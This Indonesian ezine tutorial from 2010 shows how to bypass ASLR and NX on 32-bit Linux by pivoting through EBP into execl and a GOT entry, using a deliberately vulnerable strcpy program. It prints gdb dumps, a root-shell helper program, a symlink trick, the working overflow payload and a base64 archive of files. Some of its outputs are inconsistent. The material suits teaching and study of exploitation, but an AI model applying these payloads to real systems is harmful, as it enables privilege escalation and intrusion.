@@ -1,0 +1,432 @@
+                )     )     )  (        )       
+        (    ( /(  ( /(  ( /(  )\ )  ( /(       
+ (      )\   )\()) )\()) )\())(()/(  )\()) (    
+ )\   (((_) ((_)\ ((_)\ ((_)\  /(_))((_)\  )\   
+((_)  )\___  _((_)  ((_) _((_)(_))   _((_)((_)  
+| __|((/ __|| || | / _ \|_  / |_ _| | \| || __| 
+| _|  | (__ | __ || (_) |/ /   | |  | .` || _|  
+|___|  \___||_||_| \___//___| |___| |_|\_||___| 
+
+
+
+ECHO MAGAZINE VOLUME VIII, ISSUE XXIII, PHILE 0x006.TXT
+
+In The Name of Alternate Return Into the Path - Pachin Kuro Kuro
+kyle/dot/broflovskix/at/gmail/dot/com
+
+-----[ INTRODUCTION
+
+Sejak rilis kernel versi 2.6.x, sistem operasi GNU/Linux telah menerapkan
+secara default segala hal yang berkaitan dengan sekuritas. Dari random stack
+address, random heap, random library address, stack cookies hingga implementasi
+NX (No Execute). 
+
+Dan seiring perjalanan waktu, telah banyak pula bermunculan teknik-teknik yang
+luar biasa super sekali membikin mata terbelalak dalam mengeksploitasinya, dan
+banyak sekali cara yang digunakannya. Salah satunya adalah Return to Library,
+Brute Forcing ASLR atau yang baru saja naik daun beberapa waktu lalu yaitu
+Return Oriented Programming. Kali ini saya akan mengulas sedikit tentang teknik
+eksploitasi bypassing ASLR dan NX dengan cara campur aduk tapi tetap super
+sekali. Ikuti terus ma pren :D
+
+-----[ RETURN INTO WHAT??
+
+Proses eksploitasi dengan membypass Randomize Layer seperti ASLR sudah banyak
+bermunculan dan diulas. Bahkan beberapa bulan yang lalu teknik eksploitasi
+dengan metode Return Oriented Programming (ROP) yang membypass Randomize Layer
+dan NXbit naik daun, apalagi setelah Dino Dai Zovi mempresentasikan metode ROP
+dengan detail dan jelas. Sedangkan disatu sisi, teknik eksploitasi Return To
+Library masih tetap menjadi pilihan dan mengalami perkembangan. 
+
+Mulai dari Return into Stack, Return into ESP, Return Into GOT dan lain-lain.
+Namun, dari sekian banyak pilihan itu saya belum menemukan adanya proses
+eksploitasi yang membypass Randomize Layer menggunakan register EBP. Padahal,
+register EBP berfungsi sebagai penunjuk lokasi atau Base Pointer. Dengan kata
+lain, ia tidak di random oleh randomize layer.
+
+Disini saya akan mencoba melakukan proses eksploitasi dengan memanfaatkan
+register EBP sebagai batu pijakan. Proses eksploitasinya dengan menggunakan dua
+metode eksploitasi yaitu return into library dan GOT overwrite, karena disini
+kita akan mencoba membypass Randomize Library dan NXBit karena didalam layer
+NXbit secara default, area .text tidak di atur apakah boleh mengeksekusi atau
+tidak.
+
+Ya mendingan langsung saja karena mata saya sudah terkena efek blur.
+
+
+-----[ START JURAGAN
+
+Oke, jadi sekarang kita mulai memanaskan mesinnya, ambil contoh potongan script
+sederhana dibawah ini sebagai permulaan selain ndak ribet juga ndak bikin
+pening ahahaha.
+
+korban@korban:~/Project/Ret2Path$ cat vuln.c
+#include <stdio.h>
+int main(int argc, char **argv)
+{
+	char buf[8];
+	strcpy(buf, argv[1]);
+	printf("\nEnte masukin inputan : %s\n\n",buf);
+	return 0;
+}
+
+Compile dengan opsi "-fno-stack-protector" karena fokus kita bukan membypass
+stack protector, kita cuma kepingin mainan return to the path bypass ASLR aja,
+ruwet kalo sama stack protector, ampun dije dah pokoknya.
+
+korban@korban:~/Project/Ret2Path$ gcc vuln.c -o vuln -fno-stack-protector
+
+Dan mari kita debug pake gdb
+
+korban@korban:~/Project/Ret2Path$ gdb -q vuln
+Reading symbols from /home/korban//Project/Ret2Path/vuln...(no debugging symbols found)...done.
+(gdb) disass main
+Dump of assembler code for function main:
+   0x080483f4 <main+0>:		push   %ebp
+   0x080483f5 <main+1>:		mov    %esp,%ebp
+   0x080483f7 <main+3>:		and    $0xfffffff0,%esp
+   0x080483fa <main+6>:		sub    $0x20,%esp
+   0x080483fd <main+9>:		mov    0xc(%ebp),%eax
+   0x08048400 <main+12>:	add    $0x4,%eax
+   0x08048403 <main+15>:	mov    (%eax),%eax
+   0x08048405 <main+17>:	mov    %eax,0x4(%esp)
+   0x08048409 <main+21>:	lea    0x18(%esp),%eax
+   0x0804840d <main+25>:	mov    %eax,(%esp)
+   0x08048410 <main+28>:	call   0x8048314 <strcpy@plt>
+   0x08048415 <main+33>:	mov    $0x8048500,%eax
+   0x0804841a <main+38>:	lea    0x18(%esp),%edx
+   0x0804841e <main+42>:	mov    %edx,0x4(%esp)
+   0x08048422 <main+46>:	mov    %eax,(%esp)
+   0x08048425 <main+49>:	call   0x8048324 <printf@plt>
+   0x0804842a <main+54>:	mov    $0x0,%eax
+   0x0804842f <main+59>:		leave  
+   0x08048430 <main+60>:	ret    
+End of assembler dump.
+
+Bisa dilihat pada hasil disassemble main, input yang akan kita masukkan
+nantinya di proses pada baris main+28 (0x08048410) sehingga untuk melihat
+dimana posisi inputan yang akan kita masukkan nantinya kita break pada posisi
+setelah input dimasukkan yaitu pada posisi main+33 (0x08048415).
+
+(gdb) break *main+33
+Breakpoint 1 at 0x8048415
+(gdb)
+
+Selanjutnya kita coba masukkan inputan, ambil contoh AAAA (karakter A empat
+buah) karena nantinya jika ditelusuri akan mudah dikenali (0x41414141).
+
+(gdb) r AAAA
+Starting program: /home/korban//Project/Ret2Path/vuln AAAA
+
+Breakpoint 1, 0x08048415 in main ()
+
+Lanjut gan liat dimana letak inputan karakter AAAA yang baru aja dimasukkan
+
+(gdb) x/8x $esp
+0xbffff350:	0xbffff368	0xbffff5cf	0x08048450	0xbffff378
+0xbffff360:	0x0015e985	0x0011eac0	0x41414141	0x00287f00
+(gdb)
+
+Nah ketemu khan, dapat kita lihat posisi inputannya di situ, ini mau diulang
+berapa kalipun nilainya bakalan tetap sama karena posisi ini ndak di random
+sama ASLR. Oke deh selanjutnya kita cari posisi fungsi execl di memory letaknya
+ada dimana
+
+(gdb) x/x execl
+0x1c8820 <execl>:	0x53565755
+(gdb) x/8i execl
+0x1c8820 <execl>:	push   %ebp
+   0x1c8821 <execl+1>:	push   %edi
+   0x1c8822 <execl+2>:	push   %esi
+   0x1c8823 <execl+3>:	push   %ebx
+   0x1c8824 <execl+4>:	sub    $0x1018,%esp
+   0x1c882a <execl+10>:	mov    0x1030(%esp),%eax
+   0x1c8831 <execl+17>:	lea    0x1034(%esp),%edx
+   0x1c8838 <execl+24>:	call   0x145b1f <__i686.get_pc_thunk.bx>
+   ...
+   0x1c883d <execl+29>:	add    $0xbf7b7,%ebx
+   0x1c8843 <execl+35>:	test   %eax,%eax
+   0x1c8845 <execl+37>:	mov    %eax,0x18(%esp)
+   0x1c8849 <execl+41>:	je     0x1c8952 <execl+306>
+   0x1c884f <execl+47>:	lea    0x18(%esp),%eax
+   0x1c8853 <execl+51>:	mov    $0x1,%esi
+   0x1c8858 <execl+56>:	mov    %eax,0x14(%esp)
+   0x1c885c <execl+60>:	mov    %eax,%edi
+   ... 
+   0x1c885e <execl+62>:	mov    $0x400,%ebp
+   0x1c8863 <execl+67>:	nop
+   0x1c8864 <execl+68>:	lea    0x0(%esi,%eiz,1),%esi
+   0x1c8868 <execl+72>:	mov    -0x4(%edx,%esi,4),%eax
+   0x1c886c <execl+76>:	test   %eax,%eax
+   0x1c886e <execl+78>:	mov    %eax,(%edi,%esi,4)
+   0x1c8871 <execl+81>:	je     0x1c88bd <execl+157>
+   0x1c8873 <execl+83>:	add    $0x1,%esi
+   ... 
+   0x1c8876 <execl+86>:	cmp    %esi,%ebp
+   0x1c8878 <execl+88>:	jne    0x1c8868 <execl+72>
+   0x1c887a <execl+90>:	add    %ebp,%ebp
+   0x1c887c <execl+92>:	xor    %eax,%eax
+   0x1c887e <execl+94>:	cmp    %edi,0x14(%esp)
+   0x1c8882 <execl+98>:	lea    0x0(,%esi,8),%ecx
+   0x1c8889 <execl+105>:	mov    %ecx,0x4(%esp)
+   0x1c888d <execl+109>:	cmovne %edi,%eax
+(gdb)
+
+Saya akan mengambil di execl+98 (0x1c8882) sebagai ebp pointnya. Sebenarnya
+bisa dimana saja, selama dia memang masih berada di seputaran register ebp dan
+ndak kena random dari ASLR juga sesuai dengan argumen dari execl. Kalo mau di
+ikutin terus alur memorynya akan banyak terlihat posisi ebp point yang sesuai
+dengan kriteria diinginkan execl.
+
+Oke sekarang keluar dulu dari gdb nya, terus kita cari dulu posisi di memory
+map yang ndak di random. 
+
+korban@korban:~/Project/Ret2Path$ cat /proc/self/maps
+00258000-003af000 r-xp 00000000 08:02 	168329     		/lib/libc-2.3.3.so
+003af000-003b1000 r--p 00157000 08:02 	168329     		/lib/libc-2.3.3.so
+003b1000-003b2000 rw-p 00159000 08:02 	168329     		/lib/libc-2.3.3.so
+003b2000-003b5000 rw-p 00000000 00:00 	0 
+0055a000-00576000 r-xp 00000000 08:02 	136635     		/lib/ld-2.3.3.so
+00576000-00577000 r--p 0001b000 08:02 	136635    	 	/lib/ld-2.3.3.so
+00577000-00578000 rw-p 0001c000 08:02 	136635     		/lib/ld-2.3.3.so
+00a21000-00a22000 r-xp 00000000 00:00 	0			[vdso]
+08048000-08051000 r-xp 00000000 08:02 	913941     		/bin/cat
+08051000-08052000 r--p 00008000 08:02 	913941    		 /bin/cat
+08052000-08053000 rw-p 00009000 08:02 	913941     		/bin/cat
+09650000-09671000 rw-p 00000000 00:00 	0			[heap]
+b76b9000-b78b9000 r--p 00000000 08:02 	1051751		    	/usr/lib/locale/locale-archive
+b78b9000-b78ba000 rw-p 00000000 00:00 	0 	
+b78d0000-b78d1000 r--p 002a1000 08:02 	1051751 	   	/usr/lib/locale/locale-archive
+b78d1000-b78d3000 rw-p 00000000 00:00 	0 
+bffc6000-bffe7000 rw-p 00000000 00:00 	0			[stack]
+korban@korban:~/Project/Ret2Path$
+
+Yoi dah dari dua area di bawah ini ndak di random :
+
+08048000-08051000 r-xp 00000000 08:02 	913941     		/bin/cat
+08051000-08052000 r--p 00008000 08:02 	913941    		/bin/cat
+
+Dan yang akan kita kulik-kulik itu yang bagian ini saja :
+
+08048000-08051000 r-xp 00000000 08:02 	913941     		/bin/cat
+
+Soalnya di area 0x08048000 ini tempat dimana aplikasinya di eksekusi (lihat
+bagian r-xp nya itu). Dan untuk menuntaskannya sekali lagi masuk ke dalam gdb
+juragaaaan buat ngeliat dimana tempat buat loncat nya :
+
+korban@korban:~/Project/Ret2Path$ gdb -q vuln
+Reading symbols from /home/korban/Project/Ret2Path/vuln...(no debugging symbols found)...done.
+(gdb) break main
+Breakpoint 1 at 0x80483f7
+(gdb) r
+Starting program: /home/korban/Project/Ret2Path/vuln 
+
+Breakpoint 1, 0x080483f7 in main ()
+(gdb)
+
+Kita coba liat dimana posisi global offset table nya, ane nyarinya manual
+memang masih amatiran soalnya, kalo ada yang bisa otomatis nyari posisi global
+offset table di .text bisa lebih cepet nyarinya.
+
+(gdb) x/1024x 0x08049000
+0x8049000:	0x464c457f	0x00010101	0x00000000	0x00000000
+0x8049010:	0x00030002	0x00000001	0x08048340	0x00000034
+0x8049020:	0x00001134	0x00000000	0x00200034	0x00280008
+0x8049030:	0x001a001d	0x00000006	0x00000034	0x08048034
+0x8049040:	0x08048034	0x00000100	0x00000100	0x00000005
+0x8049050:	0x00000004	0x00000003	0x00000134	0x08048134
+0x8049060:	0x08048134	0x00000013	0x00000013	0x00000004
+0x8049070:	0x00000001	0x00000001	0x00000000	0x08048000
+0x8049080:	0x08048000	0x00000524	0x00000524	0x00000005
+0x8049090:	0x00001000	0x00000001	0x00000f14	0x08049f14
+0x80490a0:	0x08049f14	0x00000104	0x0000010c	0x00000006
+0x80490b0:	0x00001000	0x00000002	0x00000f28	0x08049f28
+0x80490c0:	0x08049f28	0x000000c8	0x000000c8	0x00000006
+0x80490d0:	0x00000004	0x00000004	0x00000148	0x08048148
+0x80490e0:	0x08048148	0x00000044	0x00000044	0x00000004
+0x80490f0:	0x00000004	0x6474e551	0x00000000	0x00000000
+0x8049100:	0x00000000	0x00000000	0x00000000	0x00000006
+0x8049110:	0x00000004	0x6474e552	0x00000f14	0x08049f14
+0x8049120:	0x08049f14	0x000000ec	0x000000ec	0x00000004
+0x8049130:	0x00000001	0x62696c2f	0x2d646c2f	0x756e696c
+0x8049140:	0x6f732e78	0x0000322e	0x00000004	0x00000010
+0x8049150:	0x00000001	0x00554e47	0x00000000	0x00000002
+0x8049160:	0x00000006	0x0000000f	0x00000004	0x00000014
+---Type <return> to continue, or q <return> to quit---
+0x8049170:	0x00000003	0x00554e47	0xc2cc0481	0x79664843
+0x8049180:	0x9e5ca4a2	0xc24ac2e0	0xf4f8cb83	0x00000002
+0x8049190:	0x00000005	0x00000001	0x00000005	0x20002000
+0x80491a0:	0x00000000	0x00000005	0xc0e34bad	0x00000000
+0x80491b0:	0x00000000	0x00000000	0x00000000	0x00000001
+0x80491c0:	0x00000000	0x00000000	0x00000020	0x00000037
+0x80491d0:	0x00000000	0x00000000	0x00000012	0x00000029
+0x80491e0:	0x00000000	0x00000000	0x00000012	0x00000030
+0x80491f0:	0x00000000	0x00000000	0x00000012	0x0000001a
+(gdb) 
+(gdb) x/1024x 0x08049000
+0x8049000:	0x464c457f	0x00010101	0x00000000	0x00000000
+0x8049010:	0x00030002	0x00000001	0x08048340	0x00000034
+0x8049020:	0x00001134	0x00000000	0x00200034	0x00280008
+0x8049030:	0x001a001d	0x00000006	0x00000034	0x08048034
+0x8049040:	0x08048034	0x00000100	0x00000100	0x00000005
+0x8049050:	0x00000004	0x00000003	0x00000134	0x08048134
+0x8049060:	0x08048134	0x00000013	0x00000013	0x00000004
+0x8049070:	0x00000001	0x00000001	0x00000000	0x08048000
+0x8049080:	0x08048000	0x00000524	0x00000524	0x00000005
+0x8049090:	0x00001000	0x00000001	0x00000f14	0x08049f14
+0x80490a0:	0x08049f14	0x00000104	0x0000010c	0x00000006
+0x80490b0:	0x00001000	0x00000002	0x00000f28	0x08049f28
+0x80490c0:	0x08049f28	0x000000c8	0x000000c8	0x00000006
+0x80490d0:	0x00000004	0x00000004	0x00000148	0x08048148
+0x80490e0:	0x08048148	0x00000044	0x00000044	0x00000004
+0x80490f0:	0x00000004	0x6474e551	0x00000000	0x00000000
+0x8049100:	0x00000000	0x00000000	0x00000000	0x00000006
+0x8049110:	0x00000004	0x6474e552	0x00000f14	0x08049f14
+0x8049120:	0x08049f14	0x000000ec	0x000000ec	0x00000004
+0x8049130:	0x00000001	0x62696c2f	0x2d646c2f	0x756e696c
+0x8049140:	0x6f732e78	0x0000322e	0x00000004	0x00000010
+0x8049150:	0x00000001	0x00554e47	0x00000000	0x00000002
+0x8049160:	0x00000006	0x0000000f	0x00000004	0x00000014
+---Type <return> to continue, or q <return> to quit---
+0x8049170:	0x00000003	0x00554e47	0xc2cc0481	0x79664843
+0x8049180:	0x9e5ca4a2	0xc24ac2e0	0xf4f8cb83	0x00000002
+0x8049190:	0x00000005	0x00000001	0x00000005	0x20002000
+0x80491a0:	0x00000000	0x00000005	0xc0e34bad	0x00000000
+0x80491b0:	0x00000000	0x00000000	0x00000000	0x00000001
+0x80491c0:	0x00000000	0x00000000	0x00000020	0x00000037
+0x80491d0:	0x00000000	0x00000000	0x00000012	0x00000029
+0x80491e0:	0x00000000	0x00000000	0x00000012	0x00000030
+0x80491f0:	0x00000000	0x00000000	0x00000012	0x0000001a
+0x8049200:	0x080484fc	0x00000004	0x000f0011	0x675f5f00
+0x8049210:	0x5f6e6f6d	0x72617473	0x005f5f74	0x6362696c
+0x8049220:	0x2e6f732e	0x495f0036	0x74735f4f	0x5f6e6964
+0x8049230:	0x64657375	0x72747300	0x00797063	0x6e697270
+0x8049240:	0x5f006674	0x62696c5f	0x74735f63	0x5f747261
+0x8049250:	0x6e69616d	0x494c4700	0x325f4342	0x0000302e
+0x8049260:	0x00000000	0x00020002	0x00010002	0x00010001
+0x8049270:	0x00000010	0x00000010	0x00000000	0x0d696910
+0x8049280:	0x00020000	0x00000049	0x00000000	0x08049ff0
+0x8049290:	0x00000106	0x0804a000	0x00000107	0x0804a004
+0x80492a0:	0x00000207	0x0804a008	0x00000307	0x0804a00c
+0x80492b0:	0x00000407	0x53e58955	0xe804ec83	0x00000000
+0x80492c0:	0x34c3815b	0x8b00001d	0xfffffc93	0x74d285ff
+0x80492d0:	0x001ee805	0xf5e80000	0xe8000000	0x000001d0
+---Type <return> to continue, or q <return> to quit---q
+Quit
+(gdb)
+
+***mampus dah panjang bener***
+
+Nah ane nemunya disini nih :
+
+0x80492a0:	0x00000207	0x0804a008	0x00000000	0x0804a00c
+
+Jadi dalam bahasa manusianya, jika nanti execl nya di eksekusi, maka ia akan
+mengeksekusi program dan mengarahkan apapun inputannya ke 0x0804a008 dan
+setelah itu diikuti oleh NULL jadi tetep stabil dan gak crash pas
+eksploitasinya.
+
+Selanjutnya nyari path yang bakalan dipake untuk ngelink eksekusi menuju
+shellnya
+
+(gdb) x/x 0x0804a008
+0x804a008 <_GLOBAL_OFFSET_TABLE_+20>:	0x0804831a
+(gdb)
+
+Sip, pointing akhirnya di 0x0804831a, ubah jadi bentuk little endian siyap saji
+\x1a\x83\x04\x08. Sip dah berarti sekarang kita dah dapet buat pengalamatan
+loncatannya yaitu di \x1a\x83\x04\x08 ini karena execl bakal mengeksekusinya,
+jadi saatnya kita buat link dari \x1a\x83\x04\x08 menuju shell.
+
+korban@korban:~/Project/Ret2Path$ cat shell.c
+#include <stdio.h>
+int main()
+{
+	setreuid(0,0);
+	system("/bin/sh");
+}
+
+korban@korban:~/Project/Ret2Path$ gcc shell.c -o shell
+korban@korban:~/Project/Ret2Path$ ./shell
+sh-3.00#
+
+Sip jalan dah shellnya, lanjut mulai ke attack abuse dan segalanya. Pertama
+buat dulu link dari \x1a\x83\x04\x08 menuju shell.
+
+korban@korban:~/Project/Ret2Path$ ln -s shell `printf "\x1a\x83\x04\x08"`
+korban@korban:~/Project/Ret2Path$
+
+Attack vector yang akan kita lakukan adalah sebagai berikut :
+
+./vuln `printf "[INPUTAN] [0x80492a0 - 20] [&execl+98]"`
+
+Alasan mengapa 0x80492a0 dikurangi 20 karena pada informasi global offset table
+0x80492a0 + 20 akan mempointing ke 0x0804831a yang telah kita ubah menjadi
+little endian. 20 inputan awal digunakan untuk proses argumentasi awal yang
+melewati register ebp untuk di eksekusi oleh execl.
+
+Oke kalo begitu lanjut dan hasil akhirnya
+
+korban@korban:~/Project/Ret2Path$ ./vuln `printf "AAAAAAAAAAAAAAAAAAAA\x8c\x92\x04\x08\x82\x88\x1c"`
+
+Ente masukin inputan : aaaabbbbccccddddeeeeeÔøΩÔøΩÔøΩÔøΩ 
+
+sh-3.00#
+
+Yap eksploitasi berhasil, selamat berakhir pekan dan tetap woyo ahahahaha
+
+
+
+-----[ KESIMPULAN
+
+Ada dua kesimpulan yang dapat diambil disini yaitu, 1) Proses Eksploitasi dalam
+keadaan tidak tidur selama 36 jam ndak bagus dan suka ndak konsen. 2) Kembali
+seperti yang telah banyak disebutkan oleh orang-orang bahwa ASLR tidak melulu
+random. 
+
+Proses eksploitasi dengan memanfaatkan area register yang tidak dirandom masih
+membuka kesempatan, dan NX Bit yang tidak membatasi exec di area .text
+cenderung mengalami kisah tragis seperti di dalam sinetron ahahahaha. 
+
+
+-----[ SHOUT & THANKS
+sum witwicky, y3dips, sakitjiwa, anton **ehm**, az001, rasarab, /b/, editor
+yang mau menahan emosi karena mengedit tulisan berantakan ini, dan echo'ers sak
+jagat memayu hayuning bawana.
+
+-----[ REFERENSI
+
+[1] "ASLR Smack & Laugh Reference".Tilo Muller 2008
+	http://netsec.cs.northwestern.edu/media/readings/defeating_aslr.pdf
+
+[2] "Bypassing non-executable-stack during exploitation using return-to-libc".C0rtex 2006
+	www.infosecwriters.com/text_resources/pdf/return-to-libc.pdf
+
+[3] "Overwriting the .dtors section".Ruan Bello Rivas 2001
+	http://synnergy.net/downloads/papers/dtors.txt
+
+[4] "Address Space Randomization in 2.6".Corbet 2005
+	http://lwn.net/Articles/121845/
+
+[5] "x86-64 Buffer Overflow Exploits and the Borrowed Code Chunks Exploitation Technique".Sebastian Krahmer 2005
+	http://www.suse.de/Àúkrahmer/no-nx.pdf
+
+
+-----[ SKRAPT
+
+begin-base64 644 skrapt.tar.gz
+H4sIAJ2rCU0AA+3U3WqDMBQHcG/nUwTHwBZpEzU6trG7PUXbC6vpGmpTSWKh
+jL37Yudgg32wgStj/99NPBpjwvEcs9FFY6fekKiTc96NLOf09fjCY4zTOIl5
+FjOPsiTLEo/wQXfVa40tNCFeuS6kqndFJfS78756/keZ5/ybtajrSTnMN7oE
+Z2n6Yf4Zzfr8M85yN88NCfcIHWY7b/3z/J9LVdZtJciNsZXcTda3vlSWbN1h
+w5H/4J8ZYbVoZRXSiI6uXXwwVmzDYLqUyv02gbv36J/6FPBTff1vdo2wp6r/
+OM77+qcpT+mx/tMc9f8bPqv/7qLQ92VE3OE1GY9dsD82hWO8bFezy0XXEqwu
+m0Po4qibv5+xRdcpGu0WWIXBXN0pK9ySpt1IRaRqWlsockUuzFzNVRC5F7v5
+WthWK0LRUAAAAAAAAAAAAAAAAAAAAL7pCfaVIwwAKAAA
+====
+
+		+---------------------------------------------------------+
+		| ECHO MAGAZINE VOLUME VIII, ISSUE XXIII, PHILE 0x006.TXT |
+		+---------------------------------------------------------+
+		| 	31 DESEMBER 2010 | http://ezine.echo.or.id        |
+		+---------------------------------------------------------+
